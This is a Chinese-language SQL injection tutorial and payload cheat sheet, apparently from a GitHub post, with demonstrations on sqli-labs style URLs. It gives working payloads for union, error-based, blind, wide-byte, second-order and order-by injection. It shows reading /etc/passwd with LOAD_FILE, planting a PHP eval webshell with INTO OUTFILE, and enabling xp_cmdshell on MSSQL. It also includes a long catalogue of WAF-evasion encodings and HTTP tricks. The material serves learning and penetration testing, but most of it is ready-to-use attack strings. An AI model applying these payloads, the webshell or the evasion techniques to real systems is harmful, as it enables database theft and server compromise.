虽说现在有XIASQL\sqlmap，或者直接ai一把梭，但是什么、为什么、怎么做还是很有必要知道的。
实际运用中，只需判断是否有注入点即可，也可深入判断是什么注入方式，再用sqlmap指定跑，也可以挂着xiasql插件以及bypass插件。

先看三种型和对应后端代码  
数字型  
select * where users from id = 2-1  


字符型  
select * where users from id = '1'  


搜索型  
SELECT * FROM users WHERE username LIKE '%a%';

后端代码    
$id=$_GET['id'];  
$sql="SELECT * FROM users WHERE id='$id' ";  
$result=mysql_query($sql);  

-----
按照数据类型区分，分为数字型，字符型，搜索型  
按照回显方式区分，分为有回显的和没有回显的  
按照请求类型区分，分为GET注入，POST注入，Cookie注入等  

按照攻击方法分类  
联合查询注入 报错注入 布尔盲注 时间盲注 宽字节注入 堆叠注入 排序注入 请求头注入 二次注入

数字运算 ?id=1+1 ?id=2-1 ?id=1/0

字符串闭合 ?id=1 and '1'='1  ?id=1 and '1'='2'

搜索型 关键字%' and 1=1 and '%'='%  关键字%' and 1=2 and '%'='%

----
写在前面  
不同数据库，有不同打法：  
1. 报错信息识别（最直观）  
- MySQL：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version  
- SQL Server：Unclosed quotation mark / Incorrect syntax near  
- Oracle：ORA-XXXXX 开头的错误代码  
- PostgreSQL：ERROR: syntax error at or near

-----
下面逐一讲解    
输入任何字符都会报错，并且无法闭合  
<img width="1093" height="981" alt="image" src="https://github.com/user-attachments/assets/d41fc449-9cab-49aa-b3d2-1ab314fb7766" />
判断数字型闭合的方法：    
单引号闭合报错，双引号闭合报错，如果存在注入，很大可能是数字型  
可以进一步验证，通过and闭合    
id=2-1 --->结果和 id=1 正常      
id=1 and 1=1 --->结果和 id=1 正常   
id=1 and 1=2 --->结果和 id=1 不一样  
如果结果和上面一样就可以完全确定是数字型  
<img width="1089" height="1128" alt="image" src="https://github.com/user-attachments/assets/fc7ca9cc-3bb2-4443-b9f6-19b9d2f03da3" />

字符型注入点  
如果是 ' 型，你输入其他字符都不会报错，包括双引号，只有单引号才能让他报错  
<img width="1146" height="678" alt="image" src="https://github.com/user-attachments/assets/a9303972-d2a5-467f-ab41-9dfe241f3479" />

可以进一步验证  
通过 and 进行闭合就行
' and ''='   
' and '1'='1     
' and '  
' and #  
' and --+  
如果不报错，证明是 ' 注入

字符型 '' 闭合判定
奇数报错，偶数不报错，这种结合上面的字典配合返回内容更高效
<img width="1121" height="1280" alt="image" src="https://github.com/user-attachments/assets/ef403bdf-fbea-4043-a08c-15fd40065fe4" />

字符型注释闭合判定  
一般是两个： --+ 和 #  
要注意#号注释，在 GET 型号必须使用 URL 编码%23，否则无效！  
<img width="1101" height="731" alt="image" src="https://github.com/user-attachments/assets/95f15927-bce5-49f5-816f-3c762eaba5a3" />

------
上面知道了是什么类型的注入点和什么类型数据库，现在就要看具体用哪种方式注出库名：  
一、 联合注入  
联合查询注入是联合两个表进行同时查询。  
利用条件：  
1. 不报错时页面有数据回显 如user= password=   	
2. 查询字段数前后必须一致   	
3. 使其前条数据查询失败  
示例：  
#查询当前数据库版本
http://www.mysql.com/Less-1/?id=-1' union select 1,2,version()-- +
  
#查询当前数据库
http://www.mysql.com/Less-1/?id=-1' union select 1,2,database()-- +

#查询所有数据库
http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(0x7e,schema_name,0x7e)  from  information_schema.schemata -- +

#查询指定数据库所有表数据
http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- +

#查询指定数据库指定表的指定列的字段值
http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(username ,0x7e, password) from users--+

这里的1，2，3占位符有多少，根据以下判断：  
1. ORDER BY 试列：?id=-1' order by 1--+ 逐个增大 N，直到报错（Unknown column '4'），说明超过列数，上一步的 N-1 就是列数。Less-1 中 order by 3 正常、order by 4 报错，所以是 3 列。  
2. union select 试错：union select 1--+ → union select 1,2--+ → union select 1,2,3--+，直到不报错即为列数匹配。  

二、 报错注入  
页面无回显，但报错时能够回显报错信息（可在报错字段注出数据库信息）    
十大报错函数：
floor()，extractvalue()，updatexml()，exp()，GeometryCollection()，polygon()，multipoint()，multilinestring()，linestring()，multipolygon()  

http://www.mysql.com/Less-5/?id=1  
?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+  
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  

三、 布尔盲注  
之所以叫盲注，是因为在注入点报错后，不会暴露报错字段，只有正确和报错页面不同，且均无回显  
此时通过页面返回正确或者错误两个差异页面，来对我们想要查询的数据其进行判断  
http://www.mysql.com/Less-8/?id=1  

?id=1' union select 1,2,3 -- +  不报错->判定有三占位符  
?id=1' and(length(database()))=8 --+  数据库长度=8 则不报错  
?id=1' and (ascii(substr(database(),1,1)))=115 --+   substr(x,1,1)从x的第一个字符开始截取1位  
database()    //  security  
substr(security,1,1)   // s  
ascii(s)  //  115  

https://www.runoob.com/w3cnote/ascii.html  码表

四、 延时盲注  
当布尔盲注真假页面差异不明显时，就需要延时盲注判断  
利用if函数对查询语句进行判断，接着根据需求而设定对应的sleep函数数值。  
http://www.mysql.com/Less-9/?id=1  
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),3)--+  if第一个条件真，执行sleep(5) ，假则执行“3” 直接响应  

五、 宽字节注入 （bypass过滤） 
当打1'发现和1 没区别，可能'被过滤，这时就要尝试此方法绕过过滤，再进行前面的注入方式

传入先使用过滤函数对传入数据进行过滤，当数据传入数据库进行代码执行时，前后编码不一致，这时数据库采用了宽字节编码。  
由于编码的识别差异性这一特点，攻击者可以进行恶意构造，使其原本的闭合得以逃逸，从而可以被利用。  

过滤函数如check_addslashes()会在' '' 等前面加 \ 来转义，使得'无法闭合  
前后编码不一致指前端传入UTF-8，\ 编码为%5c ， 而数据库连接用GBK（宽字节） 而一个汉字占2字节，第一个字节大于 0x80 ，则会与下一字节合并  
那么输入payload为 %df ' -> %df %5c' -> 汉字 '    //成功闭合

http://www.mysql.com/Less-32/  
?id=-1%df' union select 1,2,version()-- +  

六、 二次注入  （注册功能点）
数据在进行插入时，被过滤函数进行转义处理，导致恶意语句不能正常执行，但经过转义后的数据产生的 \ 不会被插入数据库中，  
在下一次进行需要进行数据查询的时候，直接从数据库中取出了存在恶意代码的数据，没有进行进一步的检验和处理，直接被调用拼接到语句当中，二次调用产生注入  

能把数据写进去可尝试此方法，如存在注册功能点，且对用户名没限制  
实现流程：

1）访问存在SQL二次注入的网站，并且已知此网站中一个真正存在的用户名：admin；  
2）进入登录界面进行注册：用户名：admin'# ，密码：123456；    
3）用新注册的用户和密码登录网站；  
4）点击“忘记密码”对我们注册的用户名：admin'# 进行密码修改：1234；  
5）此时如果网站中原本的admin用户使用此用户名和原本他自己设置的密码进行登录时，会显示密码错误，因为此时admin用户的密码已经被修改为1234了。(从数据库拿数据没有转义，直接拿admin' --，所以密码改的是admin的)
** admin'-- (--后加一个空格) admin'#无需空格

七、 堆叠注入  
执行代码中，使用了可以执行一个或针对多个数据库的查询函数（也可执行删改）。  
mysql中用;拼接多条sql语句  
必须mysqli_multi_query()才支持，实际上用联合注入即可（条件允许的话）  

八、 排序注入（有排序功能时 注入点在orderFields、sort、dir）  
作用：对查询返回的结果按一列或多列排序。  
语法格式：ORDER BY {column_name [ASC|DASC]}[,...n]  
注意：order by 语句默认按照升序对记录进行排序，不能使用字符型进行排序，没有效果，比如order by '1'是无效排序。  
如何判断排序注入？  
第一点，如果输入单引号报错，然后无论怎么样闭合，都是报错，然后修改id值有效。  

id =1正常  
id =1' 报错  
id =1' ' 报错  
id =1' ' and ''=' 报错  
id =1 '--+  报错  

最简单有效的是直接添加一个 rand()  
直接添加一个rand()后，每次的返回值都不一样  

<img width="985" height="297" alt="image" src="https://github.com/user-attachments/assets/041a9928-902e-45da-8b1c-e58897d28bce" />

<img width="834" height="389" alt="image" src="https://github.com/user-attachments/assets/22891ab7-78ca-4915-a2b4-65cfc9748329" />


<img width="1028" height="400" alt="image" src="https://github.com/user-attachments/assets/ec32ae6f-4855-473c-af5a-cd8aa3f2d6e4" />

-----
自此，基本讲完了。接下来是扩展（很少）和bypass（重点）  
1 DNSlog注入的本质  
本质：  
通过子查询，将内容拼接到域名内，利用load_file函数去访问共享文件，访问的域名记录被日志记录为报错信息，通过查询日志信息查看我们想要的数据。  
利用条件：  
1.需要在数据库中支持域名解析  
2.需要数据库配置文件中设置secure_file_priv=''  
3.支持UNC路径  
4.目标服务器需要出网  

2 前置条件  
● 数据库权限：当前数据库用户必须拥有FILE权限。  
SHOW GRANTS FOR CURRENT_USER;  
● secure_file_priv 参数： ''（空）：可任意路径读写 NULL：禁止所有文件操作 指定路径：仅能在该目录下操作 SHOW VARIABLES LIKE 'secure_file_priv';  
● 路径要求：必须知道服务器绝对路径，且路径需用单引号，不能用十六进制或CHAR()构造。  
读取文件  
利用 LOAD_FILE() 函数读取服务器上的文件：  
?id=-1' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3 --+  
常见目标文件：   
● Linux系统用户信息：/etc/passwd  
● 网站配置文件：/var/www/html/config.php  
写入文件(WebShell)  
使用 INTO OUTFILE 或 INTO DUMPFILE 写入PHP代码：  
?id=-1' UNION SELECT 1,"<?php eval($_POST[x]);?>",3  
INTO OUTFILE '/var/www/html/shell.php' --+   
区别：  
● OUTFILE：可多行输出，但会改变换行符格式  
● DUMPFILE：单行输出，保持原格式  

------
BYPASS  
从架构层面：  
找到服务器真实IP，同网段绕过，http和https同时开放服务绕过，边缘资产漏洞利用绕过。  
从协议层面：  
分块延时传输，利用pipline绕过，利用协议未覆盖绕过，POST及GET提交绕过。  
从规则层面：  
编码绕过，等价符号替换绕过，普通注释和内敛注释，缓冲区溢出，mysql黑魔法，白名单及静态资源绕过，文件格式绕过，参数污染等。  

1 绕过空格字符过滤  
某些防御的匹配规则可能会过滤掉含有空格的语句，此时可尝试将空格可以用其他字符代替

两个空格代替一个空格，用 Tab 代替空格，%a0 在URL编码中等于空格  
%20 %09 %0a %0b %0c %0d %a0 %00 /*/ /!*/  
 select * from users where id=1 /*!union*//*!select*/1,2,3,4;  
%09 TAB 键（水平） 
%0a 新建一行  
%0c 新的一页  
%0d return 功能  
%0b TAB 键（垂直）  
%a0 空格  
可以将空格字符替换成注释 /*/ 还可以使用 /!这里的根据 mysql 版本的内容  
不注释*/  

2 浮点数绕过  
select * from users where id=8E0union select 1,2,3,4;  
select * from users where id=8.0union select 1,2,3,4;  

3 NULL值绕过  
select * from users where id=\Nunion select 1,2,3,\N;  
select * from users where id=\Nunion select 1,2,3,\Nfrom users;  

4 绕过关键词过滤  
4.1 大小写双写绕过  
某些防御的匹配规则可能是某些关键词，但是匹配规则并不完善，可能不会过滤掉大小写同时存在的关键词，此时可以尝试使用大小写绕过  
将字符串设置为大小写，例如 and 1=1 转成 AND 1=1 AnD 1=1  

select * from users where id=1 UNION SELECT 1,2,3,4;  
select * from users where id=1 UniON SelECT 1,2,3,4;  

4.2 去重绕过  
mysql 查询可以使用 distinct 去除查询的重复值。可以尝试利用这点绕过过滤  
select * from users where id=-1 union distinct select 1,2,3,4 from users;  
select * from users where id=-1 union distinct select 1,2,3,version() from users;  

4.3 反引号绕过  
在 mysql 可以使用 这里是反引号 绕过一些 waf 拦截。字段可以加反引号或者不加，意义相同。  
select * from users where id=-1' union select 1,2,3,4 from `users`;  

4.4 绕过 or and xor not 过滤  
目前主流的 waf 都会对 id=1 and 1=2、id=1 or 1=2、id=0 or 1=2 id=0 xor 1=1 limit 1 、id=1 xor 1=2 这些常见的 SQL 注入检测语句进行拦截。  

像 or and xor not这些还有字符代替  
字符，字符如下  
and 等于&&  
or 等于 ||  
not 等于 !  
xor 等于|  
所以可以转换成这样  
id=1 and 1=1 等于 id=1 && 1=1  
id=1 and 1=2 等于 id=1 && 1=2  
id=1 or 1=1 等于 id=1 || 1=1  
id=0 or 1=0 等于 id=0 || 1=0  
而且在 1=1 的基础上，可添加运算符，例如  
id=1 and 1=1-1   
id=1 && 1=1-1  

4.5使用ascii 字符对比绕过  
许多 waf 会对 union select 进行拦截 而且通常比较变态，那么可以不使用联合查询注入，可以使用字符截取对比法，进行突破。  
select substring(user(),1,1);  
select * from users where id=1 and substring(user(),1,1)='r';  
select * from users where id=1 and ascii(substring(user(),1,1))=114;  
最好把'r'换成成 ascii 码 如果开启 gpc int 注入就不能用了。  
可以看到构造得 SQL 攻击语句没有使用联合查询(union select)也可以把数据查询出来。  

4.6 对于删除关键词的绕过  
有些程序会对单词 union、 select 进行转空 但是只会转一次这样会留下安全隐患。  
双关键字绕过（若删除掉第一个匹配的 union 就能绕过）  
id=-1'UNIunionONSeLselectECT1,2,3--+  
到数据库里执行会变成 id=-1'UNION SeLECT1,2,3--+ 从而绕过注入拦截。  

4.7 使用生僻函数绕过  
使用生僻函数替代常见的函数，例如在报错注入中使用 polygon()函数替换常用的 updatexml()函数  

 select polygon((select * from (select * from (select @@version) f) x));  
不同的数据库据，以及同一种数据库的版本不同，那么所支持的函数也不同  

4.8 绕过 order by 过滤  
当 order by 被过滤时，无法猜解字段数，此时可以使用 into 变量名进行代替。  
select * from users where id=1 into @a,@b,@c,@d;  

4.9 绕过union select 过滤  
目前不少 waf 都会使用都会对 union select 进行拦截 单个不拦截 一起就进行拦截。  
针对单个关键词绕过  

sel<>ect 程序过滤<>为空 脚本处理sele/**/ct 程序过滤/**/为空  
 
/*!%53eLEct*/ url 编码与内联注释  
 
se%0blect 使用空格绕过
 
sele%ct 使用百分号绕过
 
%53eLEct 编码绕过
 
大小写
 
uNIoN sELecT 1,2
 
union all select 1,2
 
union DISTINCT select 1,2
 
null+UNION+SELECT+1,2
 
/*!union*//*!select*/1,2
 
union/**/select/**/1,2
 
and(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()
 
/*!50000union*//*!50000select*/1,2
 
/*!40000union*//*!40000select*/1,2
 
%0aunion%0aselect 1,2
 
%250aunion%250aselect 1,2%09union%09select 1,2
 
%0caunion%0cselect 1,2
 
%0daunion%0dselect 1,2
 
%0baunion%0bselect 1,2
 
%0d%0aunion%0d%0aselect 1,2
 
--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2
 
/*!12345union*//*!12345select*/1,2;
 
/*中文*/union/*中文*/select/*中文*/1,2;
 
/**/union/**/select/*/1,2;
 
/*!union*//*!00000all*//*!00000select*/1,2

4.10 绕过单引号过滤  
当单引号被过滤时，可尝试使用双引号代替单引号  
select * from users where id='1';  
select * from users where id="1";  
也可以将字符串转换成16进制  
select hex('admin');  
select * from users where username='admin';  
select * from users where username=0x61646D696E;  

4.11 绕过逗号拦截  
有些防注入脚本都会逗号进行拦截，例如常规注入中必须包含逗号的语句：  
select * from users where id=1 union select 1,2,3,4;  
一般会对逗号过滤成空 select * from users where id=1 union select 1 2 3 4;这样SQL 语句就会出错。所以 可以不使用逗号进行 SQL 注入。  

绕过方法如下  
substr 截取字符串  
查询当前库第一个字符  
select(substr(database() from 1 for 1));   
注入语句示例：  
select * from users where id=1 and 's'=(select(substr(database() from 1 for 1)));  
可以进一步优化 s 换成 hex 0x73 这样就避免了单引号   0x73 -> "s" 字符s
select * from users where id=1 and 0x73=(select(substr(database() from 1 for 1)));  

min 截取字符串  
这个 min 函数跟 substr 函数功能相同 如果 substr 函数被拦截或者过滤可以使用这个函数代替。  
select mid(database() from 1 for 1);   
select * from users where id=1 and 's'=(select(mid(database() from 1 for 1)));  
select * from users where id=1 and 0x73 =(select(mid(database() from 1 for 1)));  

使用JOIN  
Join可以将两个表名或者查询结果连接起来，使用方法如下  
union select 1,2` 等价于 `union select * from (select 1)a join (select 2)b  
a 和 b 分别是表的别名  
select * from users where id=-1 union select 1,2,3,4;  
以上语句可更改成一下形式  

使用like模糊查询  
使用 like 模糊查询 select user() like '%r%'; 模糊查询成功返回 1 否则返回 0  
%：匹配零个或多个任意字符  
_：匹配单个任意字符  
找到第一个字符后继续进行下一个字符匹配。从而找到正确的用户名，也可以将 user() 替换成 database() ，从而查找库名，这种 SQL 注入语句也不会存在逗号  

需要使用 limit 时的逗号绕过  
SQL 注入时，如果需要限定条目可以使用 limit 0,1 限定返回条目的数目 limit 0,1 返回条一条记录 如果对逗号进行拦截时，  
可以使用 limit 1 默认返回第一条数据。也可以使用 limit 1 offset 0 从零开始返回第一条记录，这样就绕过拦截了。  

5 绕过等号过滤  
如果程序会对=进行拦截 可以使用 like rlike regexp 或者使用<或者>  
select * from users where id=1 and ascii(substring(user(),1,1))<115;  
select * from users where id=1 and ascii(substring(user(),1,1))>115;  
select * from users where id=1 and (select substring(user(),1,1)like 'r%');  
select * from users where id=1 and (select substring(user(),1,1)rlike 'r');  
select * from users where id=1 and 1=(select user() regexp '^r');  
select * from users where id=1 and 1=(select user() regexp '^a');  

6 利用脚本语言特性绕过
在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过过滤。  
 id=1%00&id=2 union select 1,2,3  
有些 waf 回去匹配第一个 id 参数 1%00 %00 是截断字符，waf 会自动截断 从而不会检测后面的内容。到了程序中 id 就是等于 id=2 union select 1,2,3 从绕过注入拦截。  

7 二次编码绕过  
有些程序会解析二次编码，造成 SQL 注入，因为 url 两次编码过后，waf 是不会拦截的。  
-1 union select 1,2,3,4#  
第一次转码  
%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23  
第二次转码  
%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33  

代码里有 urldecode 这个函数是对字符 url 解码，因为两次编码 GPC 是不会过滤的，所以可以绕过 gpc 字符转义，这样也就绕过了 waf 的拦截。  

------
1 冷门绕过  
信任白名单绕过  
有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作，所以可以利用这个特点，可以试试白名单绕过。  
白名单通常有目录  
/admin

/phpmyadmin

/admin.php

/sqli/sqli_str.php?a=/admin.php&name=vince+&submit=1

l/sqli/sqli_str.php/phpmyadmin?name=%27%20union%20select%201,user()--+&submit=1

此种情况也要看中间件情况使用，某些中间件对多个参数的梳理不同

pipline绕过注入  
http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用 burpsuite 截获的数  据），其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个 http 包容  量，需要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止  
用 burpsuite 抓包提交 复制整个包信息放在第一个包最后，把第一个包 close 改成 keep-alive ，把 brupsuite 自动更新 Content-Length 勾去掉。  
第一个包参数的字符要加上长度接着提交即可。有些 waf 不会对第一个包的参数进行检测，这样就可以绕过一些 waf 拦截。  

利用 multipart/form-data 绕过  
在 http 头里的 Content-Type 提交表单支持三种协议  
application/x-www-form-urlencoded 编码模式 post 提交  
multipart/form-data 文件上传模式  
text/plain 文本模式  
文件头的属性 是传输前对提交的数据进行编码发送到服务器。  
其中 multipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。  
Content-Type: multipart/form-data;  
boundary=---------------------------28566904301101419271642457175  
boundary 这是用来匹配的值  
Content-Disposition: form-data; name="id" 这也能作为 post 提交  
所以程序会接收到构造的 SQL 注入语句-1 union select 1,user()  

利用application/json 或者 text/xml 绕过  
有些程序是 json 提交参数，程序也是 json 接收再拼接到 SQL 执行 json 格式通常不会被拦截。所以可以绕过 waf   
运行大量字符绕过   
可以使用 select 0xA 运行一些字符从绕突破一些 waf 拦截  
get 编码  
id=1 and (select 1)=(select0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/!union//!select/1,user()  
post 编码  
1+and+select+1)%3d(select+0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/!union//!select/1,user()&submit=1  
利用花括号绕过  
select 1,2 union select{x 1},user()  
花括号 左边是注释的内容（mysql依旧读1）这样可以一些 waf 的拦截  

换行绕过  
目前很多 waf 都会对 union select 进行过滤的 因为使用联合查询 这两个关键词是必须的，一般过滤这个两个字符 想用联合查询就很难了。  
可以使用换行 加上一些注释符进行绕过。  
二次URL编码绕过  
原理：形式：“%”加上 ASCII 码（先将字符转换为两位 ASCII 码，再转为 16 进制），其中加号“+”在 URL 编码中和“%20”表示一样，均为空格。  
当遇到非 ASCII 码表示的字符时，如中文，浏览器或通过编写 URLEncode，根据 UTF-8、GBK 等编码 16 进制形式，进行转换。如“春”的 UTF-8 编码为 E6 98 A5，因此其在支持 UTF-8 的情况下，URL 编码为%E6%98%A5。值得注意的是采取不同的中文编码，会有不同的URL 编码。  
在 URL 传递到后台时，首先 web 容器会自动先对 URL 进行解析。容器解码时，会根据设置（如 jsp 中，会使用 request.setCharacterEncoding("UTF-8")），采用UTF-8 或 GBK 等其中一种编码进行解析。这时，程序无需自己再次解码，便可以获取参数（如使用 request.getParameter(paramName)）。  
但是，有时从客户端提交的 URL 无法确定是何种编码，如果服务器选择的编码方式不匹配，则会造成中文乱码。为了解决这个问题，便出现了二次 URLEncode的 方 法 。   在 客 户 端 对 URL 进 行 两 次 URLEncode ， 这 样 类 似 上 文 提 到的%E6%98%A5 则会编码为%25e6%2598%25a5，为纯 ASCII 码。Web 容器在接到 URL   后，自动解析一次，因为不管容器使用何种编码进行解析，都支持 ASCII码，不会出错。然后在通过编写程序对容器解析后的参数进行解码，便可正确得到参数。在这里，客户端的第一次编码，以及服务端的第二次解码，均是由程序员自己设定的，是可控的，可知的  

各种编码绕过  
1 HTTP 数据编码绕过  
编码绕过在绕 waf 中也是经常遇到的，通常 waf 只坚持他所识别的编码，比如说它只识别 utf-8 的字符，但是服务器可以识别比 utf-8 更多的编码。  
那么我们只需要将 payload 按照 waf 识别不了但是服务器可以解析识别的编码格式即可绕过。  
比如请求包中我们可以更改Content-Type中的charset的参数值，我们改为ibm037这个协议编码，有些服务器是支持的。payload 改成这个协议格式就行了。  
POST /06/vul/sqli/sqli_id.php HTTP/1.1  
Host: 192.168.0.115  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101  
Firefox/88.0  
Accept:  
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded;charset:ibm037  
Content-Length: 33  
Connection: close  
Cookie: PHPSESSID=e6sa76lft65q3fd25bilbc49v3; security_level=0  
Upgrade-Insecure-Requests: 1%89%84=%F1&%A2%A4%82%94%89%A3=%F1  

2 url 编码绕过  
在 iis 里会自动把 url 编码转换成字符串传到程序中执行。  
例如 union select 可以转换成 u%6eion s%65lect  

Unicode 编码绕过  
形式：“\u”或者是“%u”加上 4 位 16 进制 Unicode 码值。  
iis 会自动进行识别这种编码 有部分 waf 并不会拦截这这种编码  
-1 union select 1,user()  
部分转码  
-1 uni%u006fn sel%u0065ct 1,user()  
全部转码  
%u002d%u0031%u0020%u0075%u006e%u0069%u006f%u006e%u0020%u0073%u  
0065%u006c%u0065%u0063%u0074%u0020%u0031%u002c%u0075%u0073%u00
65%u0072%u0028%u0029

-----
MSSQL(SQLserve) 库
1 报错注入  
数据库版本  
SQL Server是强类型，1是int型，查询的版本是字符型，类型不一致所以报错  
?id=1 and 1=(select @@version)  
数据库名  
top 1表示只显示首条记录，master是mssql默认的数据库，sysdatabases是视图，dbid<=4的都是系统自带的库  
?id=1 and 1=(select top 1 name from master..sysdatabases where dbid>4)  
爆第二个数据库名，假设第一个爆出来的test  
?id=1 and 1=(select top 1 name from master..sysdatabases where dbid>4 and name !='test')  
爆出所有数据库名  
?id=1 and 1=(select name from master..sysdatabases for xml path)  
表名  
查询第一个用户表  
?id=1 and 1=(select top 1 name from sysobjects where xtype='u')  
其他方式与查数据库名相同  
列名  
查询出'users'表对应的ID，然后根据ID去syscolumns表查询列名  
?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='users'))  

2 盲注  
时间盲注  
id=1 and WAITFOR DELAY '00:00:05'-- ?id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:2'--  
布尔盲注  
substring()函数，用法同MySQL  

其他利用方式  
xp_cmdshell  
判断是否存在  
SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype='x' AND name='xp_cmdshell' -- 1存在,0不存在  
通过xp_cmdshell可以执行系统命令，在SQLServer2005后默认禁止，如果有SA权限可以手动开启  

-- 开启  
EXEC sp_configure 'show advanced options', 1;reconfigure;  
EXEC sp_configure 'xp_cmdshell',1;reconfigure;  
-- 关闭  
EXEC sp_configure 'show advanced options', 1;reconfigure;  
EXEC sp_configure 'xp_cmdshell', 0;reconfigure  


